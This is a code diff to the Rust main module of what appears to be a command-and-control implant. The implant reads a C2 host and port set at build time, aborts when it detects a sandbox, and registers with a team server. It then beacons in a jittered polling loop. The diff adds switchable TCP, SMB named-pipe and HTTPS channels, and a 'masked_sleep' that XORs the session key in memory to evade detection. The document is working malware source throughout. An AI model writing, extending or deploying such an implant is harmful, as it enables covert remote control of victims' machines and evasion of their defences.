@@ -21,8 +21,6 @@ mod task;
 
 use std::time::Duration;
 
-use crate::channel::Channel;
-
 // Build-time constants injected by the build service via build.rs
 const C2_HOST:       &str = env!("DM_C2_HOST");
 const C2_PORT:       &str = env!("DM_C2_PORT");
@@ -33,13 +31,25 @@ const BUILD_UUID:    &str = env!("DM_BUILD_UUID");
 const SLEEP_SECS:    u64  = const_parse_u64(env!("DM_SLEEP_SECS"));
 const JITTER_PCT:    u64  = const_parse_u64(env!("DM_JITTER_PCT"));
 
+fn make_channel() -> Box<dyn channel::Channel> {
+    #[cfg(feature = "channel-tcp")]
+    { return Box::new(channel::tcp::TcpChannel::new(C2_HOST, C2_PORT)); }
+
+    #[cfg(all(feature = "channel-smb", target_os = "windows"))]
+    { return Box::new(channel::smb::SmbChannel::new(
+        env!("DM_SMB_HOST"), env!("DM_SMB_PIPE"),
+    )); }
+
+    Box::new(channel::https::HttpsChannel::new(C2_HOST, C2_PORT))
+}
+
 fn main() {
     // Run pre-flight evasion checks before doing anything visible
     if evasion::abort_if_sandboxed() {
         return;
     }
 
-    let mut ch = channel::https::HttpsChannel::new(C2_HOST, C2_PORT);
+    let mut ch = make_channel();
 
     // Register with the team server and get session credentials
     let session = match register(&mut ch) {
@@ -50,9 +60,11 @@ fn main() {
     // Main polling loop
     let mut sleep = SLEEP_SECS;
     let mut jitter = JITTER_PCT;
+    let mut session = session; // rebind as mutable so masked_sleep can XOR the key
 
     loop {
-        thread_sleep_with_jitter(sleep, jitter);
+        let actual = compute_sleep_secs(sleep, jitter);
+        evasion::masked_sleep(Duration::from_secs(actual), &mut session.session_key);
 
         // Evasion monitor: check if our environment changed
         if evasion::should_abort() {
@@ -112,7 +124,7 @@ struct Session {
     session_key:   [u8; 32], // derived AES-256 key for encrypting traffic
 }
 
-fn register(ch: &mut impl Channel) -> Result<Session, ()> {
+fn register(ch: &mut dyn channel::Channel) -> Result<Session, ()> {
     let reg_req = build_registration_request();
     let resp = ch.register(&reg_req, PATH_REGISTER).map_err(|_| ())?;
 
@@ -149,7 +161,7 @@ fn build_registration_request() -> task::RegisterRequest {
 
 // --- Sleep with jitter ------------------------------------------------------
 
-fn thread_sleep_with_jitter(sleep_secs: u64, jitter_pct: u64) {
+fn compute_sleep_secs(sleep_secs: u64, jitter_pct: u64) -> u64 {
     let jitter_range = ((sleep_secs * jitter_pct) / 100) as i64;
     let offset: i64 = if jitter_range > 0 {
         let seed = std::time::SystemTime::now()
@@ -160,8 +172,7 @@ fn thread_sleep_with_jitter(sleep_secs: u64, jitter_pct: u64) {
     } else {
         0
     };
-    let actual = ((sleep_secs as i64) + offset).max(1) as u64;
-    std::thread::sleep(Duration::from_secs(actual));
+    ((sleep_secs as i64) + offset).max(1) as u64
 }
 
 // --- Compile-time u64 parse -------------------------------------------------
